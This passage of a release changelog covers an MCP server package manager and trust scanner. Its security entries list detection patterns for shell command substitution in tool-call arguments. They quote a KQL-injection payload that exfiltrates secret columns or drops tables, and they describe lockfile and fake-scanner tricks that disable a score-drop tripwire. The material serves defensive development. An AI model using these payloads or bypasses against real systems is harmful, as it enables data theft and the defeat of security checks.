  shorter `(?:^|\s)`) — so a concealed payload with no whitespace anywhere before its
  `--`/`//` marker is a known miss. For the CLI-flag detector that whitespace is
  load-bearing to the wrapped tool's own `command.split(" ")` vulnerability, so an
  attacker who omits it defeats their own exploit too; for query-control the same
  narrowing was already documented and accepted for the plain-text path, and the CVE's own
  PoC hits an unanchored pattern instead.

  Closes TODOS #55.

## [0.31.0] - 2026-08-28

### Fixed

- **The README states the Node requirement.** `^22.22.2 || ^24.15.0 || >=26.0.0` lived in
  `package.json`, `CONTRIBUTING.md` and `CLAUDE.md`; the front-door docs said nothing about
  Node at all, so an install on an unsupported one printed `EBADENGINE` with no README
  entry to explain it. Stated as the SUPPORTED set (22.22.2+, 24.15.0+, 26+) rather than a
  list of excluded versions, because an excluded-list can be — and in the first draft of
  this entry was — under-enumerated, leaving a reader on 22.5 to conclude they were fine.
  It also names what each package manager does: npm warns and fails under
  `--engine-strict`, while **pnpm installs an unsupported Node silently and exits 0**
  unless `engine-strict=true` is set, so on pnpm the mismatch surfaces at runtime instead.

- **The on-demand `Dogfood` workflow reports a blank input as a blank input.** Its `spec`
  has a default but is not `required`, so clearing the box in the dispatch form sends
  `''` — which `scripts/dogfood-release.sh` reads as *pack from source*, a mode needing
  the pnpm that job deliberately never installs. It died at `pnpm build` with exit 127,
  which reads as a broken repo rather than an empty field. The workflow now fails on the
  input. The guard is in the workflow, not the script: empty is a legitimate mode for the
  script's other caller (the publish gate), and it is only in published mode that naming
  a spec is mandatory. The default is not repeated as a shell fallback — two copies of it
  would drift.

- **A green dogfood names the version it exercised.** The only `--version` call discarded
  its output and the step title echoes back the *requested* spec, so the run that proves a
  release is good never contained the release number, and `@getmcpm/cli@latest` moving
  between dispatch and install was invisible. It now prints the installed version.

- **`vitest` no longer collects nested git worktrees as tests.** This repo keeps worktrees
  at `.claude/worktrees/<name>/` — inside the tree vitest globs — and only
  `coverage.exclude` was configured, so a `pnpm test` from the primary checkout ran one
  full extra copy of the suite per worktree (roughly 4x the real test count on this
  machine). CI is unaffected — a clean checkout has no worktrees — which is exactly why it
  sat unnoticed.

- **`keychain-master-key.test.ts` no longer collides with itself across processes.** Its
  `os.homedir()` mock pointed at a FIXED path under the system temp dir, so two vitest
  processes running that file at the same time shared one `secrets.enc.json` and each
  `beforeEach`'s `rm()` wiped the other's entries. Now `mkdtemp`, one home per process.

  This is what the three red tests during the v0.30.0 reconcile actually were. The first
  draft of this entry blamed "a stale worktree at an older commit" — a guess that fit the
  symptom, was never checked, and would have sent the next reader looking at the wrong
  thing. Running the one file twice concurrently reproduces it: 2 of 8 fail, 8/8 alone,
  8/8 both after the fix. The worktree rule above and this are separate bugs; the rule
  hid this one by leaving only a single copy of the file to collect.

  Closes TODOS #48.

- **A doc that quotes a stale `engines.node` range now fails the build.** The range is
  written out verbatim in `README.md`, `CONTRIBUTING.md` and `CLAUDE.md`, and nothing
  asserted any of the three matched `package.json`. `engines-invariant.test.ts`
  structurally could not: it checks a SUBSET relation against the dependency tree, and a
  within-major narrowing is still a subset — measured, not assumed, by narrowing the
  declaration to `^22.24.0` and watching all four existing assertions stay green while the
  three new ones fail.

  Verbatim containment only, against a whitespace-collapsed copy of each file so that
  reflowing a paragraph across the range is not a failure. `CHANGELOG.md` and the test's
  own header are deliberately excluded: both state what was true at a past release, so
  freezing them to the current value is what would make them wrong.

  Closes TODOS #49.

### Security

- **New signature: `shell-metachar-in-identifier-arg` — blocks shell-metacharacter /
  command-substitution syntax in a `tools/call` argument shaped like a bare identifier
  or filesystem path.** Two real, disclosed HIGH-severity CVEs (CVE-2025-53818
  github-kanban-mcp-server `issue_number`; CVE-2026-25546 godot-mcp `projectPath`)
  splice such an argument unescaped into a shell `exec()`; both PoCs scored `pass`
  against the shipped catalog, whose only `tool_call_args` signature matches sensitive
  PATH REFERENCES, not shell-metacharacter SYNTAX. The new detector (14th catalog
  entry) walks the argument KEY first — via a `canonicalizeKey` helper now shared with
  the F5 exfil-param-in-schema detector — and only tests the VALUE when the key's
  canonical form names a scalar identifier (`id`/`number`/`num`/`path`/`slug`/`uuid`/
  `identifier`/`namespace`), so a legitimate shell/exec-style tool's own `command`
  argument is never scanned. `name` is deliberately excluded (natural-language display
  names carry punctuation the value check would flag). The value patterns are `$(`, a
  backtick, `;` and `&&`.

  A pre-merge adversarial review found and fixed 5 real bugs before ship: a
  pre-existing homoglyph bug in the (now-shared) key-canonicalization helper that let a
  confusable character hide a camelCase boundary; a depth-budget bug that left every
  batch-style array-of-objects argument completely unwalked; a whitespace-gated `&`
  pattern that was trivially evadable by omitting a space (fixed by dropping the
  pattern, not widening it — an unconditional bare-`&` match would FP on real path
  values like `R&D/report.pdf`); a routing change that made the server-initiated
  block-to-origin path reachable from the wrong (client→server) direction in the
  in-process relay; and a redundant regex alternative. `truncate`/`MAX_EXCERPT`/the
  "worst action across findings" reduce — each independently duplicated three or four
  times across the guard subsystem once this detector added its own copies — are now
  single shared exports from `patterns.ts`, `worstAction` included: the four remaining
  verbatim copies in `run-inner.ts` and `drift.ts` were folded into it during the
  pre-release audit, which is what made that sentence true rather than aspirational.

  **A pre-release audit then dropped the bare-pipe pattern**, found by measuring the
  detector against a benign corpus rather than reading it. `/\|/` hard-BLOCKED three
  ordinary values under a `path`-suffixed argument — `?family=Roboto|Open+Sans` (the
  Google Fonts URL shape), `?fields=id|name|email`, `?sort=created|desc` — because the
  reasoning that admitted the `path` suffix ("a filesystem path never contains an
  unescaped `|`") is true of filesystem paths and false of the argument key, which is
  routinely a URL path. Dropped on the same three premises this file already uses for
  `&`: gating is evadable, ungated it FPs, and neither CVE needs it — both still block,
  and removing it left all 150 guard tests green, so nothing pinned it. The cost is
  stated rather than hidden: a pipe-ONLY injection now passes. Filed as TODOS #56 with
  the measurement and a route to restoring it.

  Known gap, documented not fixed: this detector does not run through the tag-block /
  base64 decode-and-rescan passes the regular signature catalog uses, so an encoded
  payload in an identifier-shaped argument evades it. Filed as TODOS #55.

  Closes TODOS #50.

- **New signature: `query-control-syntax-in-identifier-arg` — blocks query-language
  control syntax in a `tools/call` argument shaped like a bare table, column, database,
  schema, or resource identifier.** CVE-2026-33980 (pab1it0/adx-mcp-server) f-string-
  interpolates a `table_name` argument directly into a live KQL query with no escaping;
  the advisory's own PoC uses pipe re-scoping plus a trailing `//` comment
  (`... \| project Secret, Password \| take 100 //`) to exfiltrate columns, and a
  sibling PoC uses a newline + `.drop table` to destructively drop tables — through
  tools marketed as safe read-only metadata inspectors. Same key-first design as #50
  (the new detector, 15th catalog entry, shares its argument-tree walker with
  `shell-metachar-in-identifier-arg`): only tests the VALUE when the key canonicalizes
  to a schema/resource noun (table/column/field/collection/database/schema/index/view/
  dataset) or a scalar-id suffix, so a query-builder tool's own `query`/`filter`
  argument is never scanned. `name` alone stays excluded, same reasoning as #50.

  A pre-merge adversarial review (2 independent finder angles) converged on the same
  real bug before ship: the line-comment patterns (`--`, `//`) had no adjacent-context
  requirement, unlike the pipe and `.drop` patterns — so a `database`/`schema` key
  holding an ordinary connection-string URI (`mongodb://...`, `https://...`) or a
  version-suffixed name (`analytics--eu-west`) false-blocked. Fixed by anchoring both
  comment patterns to whitespace-or-start immediately before the marker, which clears
  both FP classes without weakening detection of the motivating CVE (still caught
  independently by the pipe+verb pattern).

  Same known gap as #50, not fixed here: no tag/base64 decode-and-rescan. Filed as part
  of TODOS #55.

  Closes TODOS #51.

- **`policy.blockOnScoreDrop` no longer trusts a native-evidence figure that could
  differ by which external scanner happened to be configured at lock time vs. check
  time.** `nativeTrustScore` (the #33 hard-floor figure) deliberately lets an
  external-only critical/high finding zero the `registryMeta` bucket — correct for a
  single point-in-time floor check. But the drop check compares that shape of figure
  across TWO different points in time, and whether the cap fired at each point depends
  on `MCPM_EXTERNAL_SCANNER`, which the same attacker controls independently at both.
  Reproduced: a real scanner reporting a critical at lock time zeroed `registryMeta`,
  lowering the locked baseline; a later fake clean scanner left it un-zeroed, masking a
  genuine native regression of up to 10 points. A new `dropCheckNativeScore` figure —
  distinct from, and used only in place of, `nativeTrustScore` for this ONE gate — is
  immune to it, and a new `TrustSnapshot.dropCheckNativeScore` lockfile field carries it
  forward from lock time.

  Found by adversarial review, before merge: the first cut trusted the new lockfile
  field outright, with no validation analogous to the existing `externalScanCredit`
  check — a lock edit reading an otherwise-ordinary `score` alongside
  `dropCheckNativeScore: 0` silently and permanently disarmed the drop check, less
  detectably than editing `score` directly (which is visible everywhere else the
  server is shown). Closed with a bound derived from the scorer's own bucket ceilings.

  Residual, same shape as #35's own launch: a lock written BEFORE this fix stays
  exposed to the bypass until the next `mcpm lock`.

  Closes TODOS #41.

### Changed

- **`mcpm audit` no longer calls every server `caution`.** A server that cleared every check
  mcpm actually ran now reads **`clean · not run`**. Measured over 748 live registry servers
  scored through the real scanner: **all 748 were `caution`** — the 3-level scale collapsed
  to one level across the entire public ecosystem, and no server mcpm audited could ever be
  green. The cause is that audit never runs a health check, so that bucket contributes a
  flat 15 of 30 — a constant, not evidence — and on real data the score only occupies 50–62
  of 80, leaving the verdict decided by the constant rather than by the server.

  **A relabel, not a re-score.** `score`, `maxPossible` and `level` are untouched, because
  each is load-bearing somewhere a relabel must not reach: `level` is in the lockfile enum
  and decides audit's exit code, and the absolute score is what `--min-trust` compares.
  Re-basing the arithmetic instead — the fix TODOS #43 proposed — would have moved absolute
  scores DOWN 15, breaking existing `--min-trust` scripts, while moving percentages UP,
  silently loosening `policy.minTrustScore`. The silent direction is the one nobody notices.

  The label is decided on the buckets that were actually MEASURED: health leaves both the
  numerator and the denominator, exactly the way the external-scanner bucket already does
  when it is not credited. Deliberately not "would it be safe if the health check had
  passed", which assumes a perfect result for the one thing nobody checked.

  **`clean` means the scan found nothing** — not merely that the measured buckets land in
  the top band. The first cut checked only the band, and on the same 748 servers that
  labelled 743 of them clean, 414 of which carry findings; `mcpm audit` prints a findings
  count in the next column, so those rows contradicted themselves. Both deduction-bearing
  buckets must be intact, external included: a caller-supplied scanner may not INFLATE
  mcpm's verdict (#33/#35), but it is free to make it worse. Final split on live data:
  **329 `clean · not run`, 419 `caution`** — the scale distinguishes something again,
  where before every server got the same word.

  A server whose health check really did run still reads `safe`, and the label is cyan
  rather than green because "found nothing" is weaker than "verified". Note what that
  demotes: an 82/100 server reaching `safe` **only** because a credited external scanner
  supplied 20 points now reads `clean · not run`, which is the perverse incentive #43 is
  named for.

  The same relabel is applied to **`install`, `update`, `outdated` and `why`**, all of which
  also score with `healthCheckPassed: null`. In `install` it also reaches the consent flow:
  a server with no findings used to print "CAUTION: this server has a moderate trust score"
  and ask for a caution-flavoured confirm on essentially every install, which is consent
  fatigue rather than a warning. It now says what was not checked and asks plainly —
  quieter, not silent.

  `audit --json` keeps `level` byte-identical and gains `healthCheckRun`; `outdated --json`
  keeps `latestLevel` and gains `latestLevelLabel`. Exit codes are unchanged, with a test
  pinning it.

- **`levelColor` matches case-insensitively.** `install`'s trust display passes
  `level.toUpperCase()`, which fell through to `default` and returned the string
  uncoloured — every trust level in the install flow has been printing monochrome.
  Uppercasing the result instead is not an option: it corrupts the escape sequence.

- **The pre-publish gate now proves the packed artifact on three Node majors, not one.**
  `publish.yml` packed the tarball, clean-installed it and smoke-ran the real binary — the
  strongest gate in the pipeline — but only on Node 24. The lowest supported major is where
  "we used an API that does not exist yet" bites and the newest is where a fresh
  incompatibility appears first, so 24 was arguably the least informative of the three.

  It is now a `dogfood` job matrixed over 22/24/26 that `publish` `needs:`, so a failing leg
  stops `pnpm publish` from ever running. `fail-fast: false`, because "26 is broken, 22 and
  24 are fine" is exactly the answer you want while deciding whether to cut a release.

  A separate **job** because neither inline shape works — not because it is faster. A step
  cannot carry `strategy.matrix`, so three majors inside `publish` would run serially; and
  matrixing the `publish` job itself would run `pnpm publish` three times, which is fatal
  rather than slow. The cost is real and is paid deliberately: measured over the last four
  releases the inline gate was 11–13s of a 62–80s publish job, and the new job adds a
  bootstrap ahead of publish, taking the release critical path from roughly 75s to 95s.

  The single-major copy inside `publish` is gone rather than kept alongside: with 24 in the
  matrix it was the same gate on the same commit twice. What is given up is nothing that
  existed — the smoked pack was never the published one, because `pnpm publish` re-packs
  from source regardless.

  Each leg reaches its major's LATEST minor, not the declared floor: `setup-node` with `22`
  resolves the newest 22.x, so an API added after 22.22.2 is still untested here. The
  dependency-floor half of that class stays covered by `engines-invariant.test.ts`, which
  reads the dependency tree and so does not care which Node runs it.

  Verified before merge rather than on the next release, since `publish.yml` triggers only
  on a `v*` tag and cannot otherwise be exercised without publishing: the job body was
  sliced out of `publish.yml` programmatically into a temporary push-triggered workflow —
  with exactly one line changed, the tag-derived `npm pkg set version`, which a branch push
  has no tag to satisfy. All three legs packed from source, installed under
  `--engine-strict` and passed all eight smoke assertions. Pack-from-source on 22 and 26 had
  never run in CI before: `dogfood.yml` only runs published mode, and the v0.30.0 checks on
  those majors were run on a laptop.

  Partly closes TODOS #47; the publish path still typechecks only against the pinned
  `@types/node`, which is tracked there.

- **The release gate's Node matrix is now guarded against drift.** It was a third hand-synced
  copy of the major list, after `engines.node` and `ci.yml`, and the only test that reads a
  workflow read `ci.yml` exclusively — so narrowing the gate back to `[24]` left all 2443
  tests green while the strongest gate in the pipeline silently stopped covering two
  supported majors. Only that direction is silent: widening it to an *unsupported* major
  already fails at release time, because the dogfood installs under `--engine-strict`.

  Asserted equal to `ci.yml`'s matrix rather than to "every major `engines.node` admits" —
  the range ends in an open-ended `>=26.0.0`, so the admitted set is unbounded and no fixed
  matrix can satisfy it. `ci.yml` is the satisfiable anchor, and it is already checked
  against `engines.node`. A new major still has to be added by hand when one ships.

## [0.30.0] - 2026-08-17

### Fixed

- **The release dogfood no longer runs against your real MCP config, and can run
  somewhere that is not your laptop.** `scripts/dogfood-release.sh` sandboxed the
  install directory but then ran the binary with the real `$HOME`, so `mcpm doctor`
  read the maintainer's actual client configs and `~/.mcpm` — reporting one machine's
  setup as if it were a property of the artifact. The smoke run now uses a throwaway
  `$HOME`, the same trick `dogfood-confine.sh` already used and for the same reason
  (every mcpm path derives from `os.homedir()`). Set *after* build/pack/install, since
  pnpm's store and npm's cache also live under `$HOME`.

  The script also accepts `MCPM_DOGFOOD_SPEC` to smoke an **already-published** version
  instead of packing from source — no build, no pnpm. A new on-demand `Dogfood`
  workflow drives exactly that across Node 22/24/26 plus macOS, so a release can be
  verified without a conforming Node installed locally, and a machine outside
  `engines.node` is no longer a blocker. Deliberately the same script as the publish
  gate: a second copy of the smoke suite would drift, and "we dogfooded it" would come
  to mean two different things. Partly closes TODOS #47.

- **A trust threshold higher than mcpm can award now says so, instead of refusing
  every server forever.** Every score gate in the product is evaluated BEFORE the
  health check runs (`healthCheckPassed: null`) and mcpm never reads a download
  count, so 18 of the 80 native points are unreachable at gate time. A flawless
  server tops out at **62/80**. `mcpm install --min-trust 63` therefore refused
  every server in the registry, forever, while the message read
  `Trust score 62/80 is below the required minimum of 63` — blaming the server and
  sending you to look for a better one. `policy.minTrustScore` failed the same way
  on `mcpm up`, and the MCP install gate failed worst of all: it scores with
  `hasExternalScanner: false` unconditionally, so an agent asking for a
  natural-sounding `minTrustScore: 70` got a blanket rejection whose honest reading
  is "the MCP ecosystem is unsafe", with no human in the loop to notice the
  threshold was impossible.

  All **five** gates — `audit --fix --min-trust` (which had the only guard, from
  TODOS #42), `install --min-trust`, `policy.minTrustScore`, the MCP install floor,
  and `mcpm_setup`'s pre-filter — now share one `maxAchievableBeforeHealthCheck()`
  exported from `scanner/trust-score.ts`, replacing `audit`'s private copy of the
  replayed-inputs literal. An unsatisfiable threshold is refused by naming the ceiling
  and why it exists. Nothing that previously installed is now refused: both branches
  already refused, so this changes the diagnosis, not the outcome.

  `mcpm_setup` was the fifth and it was nearly missed: it does not forward its
  threshold to the install gate (forwarding would let a caller-supplied `30` LOWER the
  enforcing gate), so the install guard could never fire from that path. It is also the
  worst place to omit — every keyword reports its best match as "below minimum", and an
  agent reading a blanket rejection concludes the ecosystem is unsafe.

  Every refusal that HAS a scored server in hand recommends the score that server
  **actually reached**, never the model ceiling. `audit`'s sibling guard already did this
  and says why: a threshold above what was observed refuses "for what audit cannot measure
  rather than for their evidence" — and recommending 62 would itself be unsatisfiable for
  any npm server, producing a second refusal. `mcpm_setup` is the one gate that cannot
  follow the rule: it is a pre-filter that fires **before** the keyword search runs, so no
  server has been scored yet and the ceiling is the only number it can name. That is a
  property of where the gate sits, not an oversight — but it does mean an agent handed
  `62` there can still hit a second refusal on an all-npm stack.

  `policy.minTrustScore`'s reason is scoped to servers scored the way that one was, not
  to the whole stack, because crediting is decided per server and a mixed-credit run
  legitimately contains both ceilings; it also stops prescribing an edit to a committed,
  team-shared threshold on the strength of one machine's scanner.

  **`--min-trust` and `policy.minTrustScore` are the same idea in different UNITS**,
  which is the trap here. On mcpm-native evidence the absolute gates are unsatisfiable
  above **62** and the policy gate — a PERCENTAGE — above **78**; where the external
  scanner bucket is CREDITED both ceilings rise, to 82/100 and 82%, and each guard picks
  its ceiling from the score in front of it rather than assuming one. 78 and not 77.5, because
  `toPct` rounds and a flawless 62/80 reports as 78, so 78 passes and 79 is the
  first impossible value. The ceiling is put through the same `toPct` as the score
  it is compared against, so the boundary is exact by construction rather than by
  two hand-computed constants agreeing.

  `install --json` gains a distinct `min_trust_unsatisfiable` error code carrying
  `ceiling` and `maxPossible` (the `--json` shape is UNSTABLE per `docs/CONTRACTS.md`).
  Residual, unchanged: 62 is reachable only by a pypi/oci server — every npm package
  draws one `low` `install-script` finding for the `npx -y` launcher class, capping a
  clean npm server at 60 — so `--min-trust 61..62` stays unsatisfiable for an all-npm
  stack. Stated rather than papered over.

### Changed

- **Dependency backlog cleared, including a `chalk` major.** `chalk` 5.6.2 → **6.0.0**,
  `@modelcontextprotocol/sdk` 1.29.0 → 1.30.0, `@sigstore/verify` 4.1.0 → 4.1.2,
  `@types/semver` 7.7.1 → 7.8.0, and the SHA-pinned `pnpm/action-setup` → v6.0.10.

  `chalk` 6 is a major for two reasons that both land on this project. It raises
  `engines.node` to `>=22` — already satisfied since #168 set the floor at 22.22.2 —
  and it drops the `main` field, so the package resolves through `exports` only. mcpm
  imports nothing but the default export, so the type surface is unaffected (the named
  exports it removed from the declaration file were re-added with narrower types), but
  an exports-only dependency is exactly the class of change that passes every source
  test and then fails on a clean install of the packed tarball.

  CI does not run the release dogfood — only `publish.yml` does — so that break would
  have surfaced at publish time. The packed artifact was therefore dogfooded before
  merge on both ends of the supported range: Node 22.23.2, the oldest major (whose
  declared floor is 22.22.2 — that is where "we used an API that does not exist yet"
  bites), and 26.7.0, the newest (where a fresh incompatibility appears first). Both
  clean-install and smoke green. This is TODOS #47 gap 2 paid manually for one PR; the
  gap itself is unchanged.

## [0.29.1] - 2026-08-15

### Fixed

- **The type layer now covers every Node major CI builds on.** `@types/node` is
  pinned to the `engines.node` floor (22), so `tsc` described Node 22's API on
  every CI leg — including the legs running 24 and 26, and anything whose
  signature CHANGED in a later major went unchecked. Three WebCrypto call sites
  in `src/store/keychain.ts` had already drifted: `@types/node@25` narrowed
  `BufferSource` to reject views over a `SharedArrayBuffer`, and a bare `Buffer`
  or `Uint8Array` annotation defaults to `ArrayBufferLike`, which includes one.

  The values were never wrong — `randomBytes()` and `Buffer.from(hex, "hex")`
  are both `ArrayBuffer`-backed — only the annotations were wider than the
  values, so the fix is `Buffer<ArrayBuffer>` / `Uint8Array<ArrayBuffer>` along
  the master-key chain. Nothing runtime changes; the existing round-trip,
  migration and legacy-decrypt tests for both schemes are the evidence.

  CI now re-runs the typecheck on each matrix leg against `@types/node` for that
  leg's own Node, so the matrix stays the single source of which majors get
  checked. Measured, not assumed: with the annotations reverted the tree
  typechecks clean under `@types/node` 22 **and** 24 and fails under 25 and 26 —
  so a guard pinned at or below 24 would have missed it, and no fixed pin stays
  the right guess as the matrix moves. The per-leg re-run is the forward-looking
  form. Scope is the compiled sources: `tsconfig.json` excludes `**/*.test.ts`,
  and bringing the test tree under `tsc` surfaces pre-existing unrelated errors,
  so that stays out.

  The pin stays at 22 on purpose — it is what stops `tsc` accepting an API a
  Node 22 user would not have, and raising it would trade a silent type-level
  gap for a silent runtime one. The `dependabot.yml` comment claiming
  `@types/node@26` breaks `tsc --noEmit` is corrected: the tree typechecks clean
  against 22, 24, 25 and 26. Its TypeScript claim is reworded but NOT
  re-measured — it named 6.x, while npm `latest` has moved to 7.x, so the
  deferred migration is now 5.9 → 7. An attempt to measure it here installed
  TypeScript 7 and produced 364 `cannot find name 'process'` errors, which is a
  broken harness rather than a result, so the major stays held.

- **`engines.node` now matches what the dependencies actually require.** The
  declared range was `>=22.9.0`, but four direct runtime dependencies —
  `@sigstore/bundle` and `@sigstore/verify` (`^22.22.2 || ^24.15.0 || >=26.0.0`),
  `@inquirer/prompts` (`>=23.5.0 || ^22.13.0 || ^20.17.0`) and `commander`
  (`>=22.12.0`) — require more, 20 packages across the transitive closure.
  Anyone installing on Node 22.9–22.22.1, 24.0–24.14, 23.x or 25.x got
  `EBADENGINE` warnings, and a hard install failure under `engine-strict=true`.
  The range is now `^22.22.2 || ^24.15.0 || >=26.0.0`, the exact intersection.

  The declaration was never correct: v0.23.0 set `>=22.9.0` to match
  `@sigstore/bundle@4`, but `commander@15` and `@inquirer/prompts@8.5.2` were
  already in the lockfile that day and both required more. The
  `@sigstore/bundle@4 → @5` bump five days later widened the gap — raising the
  22.x floor to 22.22.2 and newly excluding 23.x, 24.0–24.14 and 25.x — it did
  not create it.

  CI could not catch it: the matrix is `[22, 24, 26]` and `setup-node` resolves
  the latest minor of each, which satisfies the dependency ranges, so the
  declared **floor** is never the Node that runs. A new
  `engines-invariant.test.ts` checks the declaration against the installed
  dependency tree directly, independent of the Node executing the suite.

  `scripts/dogfood-release.sh` now passes `--engine-strict`. Its header already
  claimed a broken artifact with "an engines mismatch" could never reach npm,
  but the install line discarded npm's warning, so the gate could not perform
  the check it advertised.

  If you are on an excluded Node, upgrade within your major (22.22.2+, 24.15.0+)
  or move to 26. Nothing about mcpm's behaviour changed — only the honesty of
  what it claims to support.

## [0.29.0] - 2026-08-13

> Upgrade note: if you use `policy.blockOnScoreDrop` AND locked with a working
> `MCPM_EXTERNAL_SCANNER` on v0.28.0, that lock predates the `externalScanCredit` field and
> its native baseline cannot be recovered exactly, so `up` compares against a conservative
> upper bound and may block servers that have not changed. Run `mcpm lock` once to record an
> exact baseline. Tracked as TODOS #44.

### Added

- **`mcpm audit` exits `2` when the invocation itself cannot be satisfied**, keeping
  its documented exit `1` ("a server is risky") meaningful to CI. Previously an
  impossible `--min-trust` and a genuinely risky server were indistinguishable by exit
  code. Scoped to four refusals — `--min-trust` above the achievable ceiling, `--fix
  --json` without `--yes`, `--min-trust` without `--fix`, and `--sarif` with `--fix`;
  Commander's own argument-parse failures still exit `1`. `docs/CONTRACTS.md` permits
  adding codes but never repurposing them.

### Fixed

- **`mcpm audit --sarif --fix` is now refused instead of silently dropping `--fix`.**
  The SARIF branch returns before the fix step, so that combination never removed
  anything while appearing to have been accepted.
- **`mcpm install --min-trust` reported the wrong denominator.** The abort message
  hardcoded `/100`, but a score is out of **80** unless the external-scanner bucket was
  credited — the default. A flawless 62/80 (77.5%) server read as "62/100", pointing
  the user at the server rather than at a threshold the command cannot satisfy. The
  `--json` error gained `maxPossible` for the same reason.

### Removed

- **`mcpm outdated` no longer reports a "trust score regression" (TODOS #35 sibling).**
  It compared a number frozen in `servers.json` against a freshly computed one, and
  the two were never comparable — every writer of the stored number used different
  inputs. Measured against a fresh comparand of **60** on a server that had **not
  changed**: `mcpm install` with an external scanner stored **80** (a permanent false
  regression on every run, forever), `mcpm import` stored **53** because it scores with
  empty registry metadata (so a genuine 7-point degradation was silently *masked*, and
  phantom "improvements" were shown), and `mcpm update` stored **nothing at all** — it
  rebuilds the store record without the field, which had already killed the check
  outright for every updated server. Only one configuration was ever correct:
  CLI-installed, no external scanner, never updated, past the release-age cooldown.

  `outdated` keeps what it can compute honestly — the version-drift line, with the
  latest version's freshly-scanned trust level. Use **`mcpm audit`** for degradation:
  it re-scans every installed server against the current registry entry and reports the
  finding itself — score, level and a finding count in the table, with severity, message
  and location under `--json`/`--sarif` — plus an exit code. That is strictly more than
  a delta integer conveyed.

  `outdated --json` drops `trustRegression` and `installedTrustScore` (this shape is
  documented UNSTABLE in `docs/CONTRACTS.md`; only `sync --json` is frozen).
  `InstalledServer.trustScore` is removed from the store along with its two writers, so
  the number cannot be silently resurrected — an existing `servers.json` carrying the
  key still parses, and the stale value is ignored. It is not actively scrubbed: the
  store rewrites records verbatim, so the dead key survives on disk until that server
  is next updated or reinstalled. That is inert, and deliberately preferred to having
  the shared read path discard fields it does not recognise, which would make an older
  binary silently destroy data written by a newer one.

### Security

- **A committed `mcpm-lock.yaml` can no longer steer `policy.blockOnScoreDrop` through
  its recorded external-scanner credit.** The lock lives in the user's own repository
  and has no integrity sidecar, and the new `externalScanCredit` field was read back
  with only a lower clamp — so `externalScanCredit: 999` on an untouched `score: 82`
  snapshot recovered a baseline of 0%, after which no current score could ever be
  "below" it and the rug-pull tripwire was dead, while `score` and `level` stayed
  pristine in the diff a reviewer reads. A negative value inflated the baseline past
  100% instead, blocking every server until a re-lock. Subtler and more plausible than
  either: a credit that is individually in range (`20`) added to a snapshot whose
  denominator was never widened (`maxPossible: 80`) dropped the baseline from 78% to 53%
  and turned a block into a pass — `lock` cannot write that combination, since it records
  `breakdown.externalScan`, which the scorer zeroes whenever it did not credit the
  bucket, so rejecting it costs no false positives. A credit outside the range the
  running version can interpret is now treated as if the field were absent (falling to
  the conservative upper bound) rather than clamped into range, and every recovery path
  exits through one clamp — `score` and `maxPossible` are themselves unbounded, so a
  lock reading `score: 250` previously reported "dropped from 288%". The bound is
  enforced in `stack/policy.ts`, deliberately not in the schema: `parseLockFile`
  whole-file `safeParse`s and throws, so a schema `.max()` would brick
  `up`/`verify`/`diff` over an otherwise-fine lock.

- **`policy.blockOnScoreDrop` no longer trusts an unverifiable external scanner
  (TODOS #35).** The rug-pull tripwire compared raw trust-score percentages, and
  crediting the external-scanner bucket moves the denominator 80 → 100 — inflating
  the percentage for any native score below 80. A caller-supplied
  `MCPM_EXTERNAL_SCANNER` printing `{"findings":[]}` could therefore mask a genuine
  native score drop (reproduced: native evidence falling 75% → 69% passed with a
  fake scanner). The check now compares mcpm-**native** evidence on both sides — the
  same rule the hard trust floor already applied (#33). Lock snapshots record an
  `externalScanCredit` field so the locked native baseline is recoverable; pre-#35
  locks written with a scanner credited are compared against a conservative upper
  bound on their native figure rather than raw — the raw-comparison fallback was
  removed outright, because it failed OPEN on a genuine native drop. `minTrustScore`
  and `--min-trust` are unchanged — a human threshold on the user's own machine.
  The sibling `audit --fix` comparison was investigated and deliberately left on
  the raw score (TODOS #35); `outdated` is tracked separately.
- **`mcpm audit --fix --min-trust` above the achievable ceiling no longer proposes
  your entire stack for removal (TODOS #42).** Pre-existing. `--min-trust` accepts
  0–100, but `audit` never executes servers, so the health check never runs (15 of
  30 points) and no download count is read (registry metadata caps at 7 of 10): a
  **flawless** server — zero findings, active status, years-old publish date — tops
  out at 62/80. Any threshold above that put every installed server below it by
  construction. Measured on three zero-finding servers: `--min-trust 62` removed
  0 of 3, `--min-trust 63` removed 3 of 3. This was not merely a confusing prompt —
  `--fix --json` is forced to `--yes` and suppresses the candidate list, and the
  config `.bak` is written once per file lifetime rather than per removal, so a
  scripted run deleted every server entry (and its plaintext `env` values) with
  nothing to restore from. `audit --fix` now refuses a threshold above the highest
  score it can produce for **every** server in the run — after the scan, before
  anything is removed. The ceiling is derived from the scorer rather than hardcoded
  and tracks whether an external scanner is credited (62 native, 82 credited).

  It reduces with `Math.min`, not `Math.max`. Crediting is decided per server, so a
  half-working scanner yields a mixed run, and taking the best server's ceiling let a
  threshold in 63..82 through — deleting the servers whose scan errored, whose
  evidence was flawless. A scanner error means the scanner is absent, which is a
  statement about the scanner, not the server. Refusing the whole run deletes nothing,
  the only safe direction on the CLI's single destructive score gate.

  Two residuals are documented rather than hidden: 62 is reachable only by a pypi/oci
  server (every npm package draws one `low` for the `npx -y` launcher class, capping a
  clean npm server at 60, so `--min-trust 61..62` is unsatisfiable for an all-npm
  stack), and a server that is unverified or published within 30 days tops out lower
  still — that one is the registry-metadata bucket working as designed.
- **`mcpm lock` no longer destroys a stack file that is not named `*.yaml`.**
  Pre-existing since v0.3.0: the lock path came from an anchored, case-sensitive
  `/\.yaml$/` replace, so `mcpm lock -f mcpm.yml` (also `.YAML`, or an
  extensionless path) derived a lock path identical to the stack path and wrote the
  generated lock **over the user's own server declarations**, reporting success and
  exiting 0. Path derivation is now one shared `lockPathFor()` used by
  `lock`/`up`/`verify`/`diff`, which inserts `-lock` *before* the extension and
  preserves it — `mcpm.yaml` -> `mcpm-lock.yaml` (unchanged, so no lock file on disk
  moves), `mcpm.yml` -> `mcpm-lock.yml`, an extensionless `stack` -> `stack-lock`.
  A first cut instead stripped any yaml extension and appended a fixed `-lock.yaml`;
  that cured the self-overwrite but was **not injective**, so `mcpm.yaml`,
  `mcpm.yml` and `mcpm.YAML` in one directory all mapped onto a single
  `mcpm-lock.yaml` and locking one silently overwrote another's trust snapshots and
  Sigstore provenance baselines. Preserving the extension makes the map invertible,
  and therefore injective. Never released in the stripping form.

## [0.28.0] - 2026-08-05

### Security

- **The tier-2 external scanner was both dead and an unclaimed-name
  fetch-and-execute vector.** Every version of mcpm up to this one probed for the
  optional external scanner by running `npx @invariantlabs/mcp-scan --version`.
  That package does not exist on npm — it returns 404, and the entire
  `@invariantlabs` scope is unregistered. Two consequences, one embarrassing and
  one serious:

  - `checkScannerAvailable()` could never resolve that name from the public npm
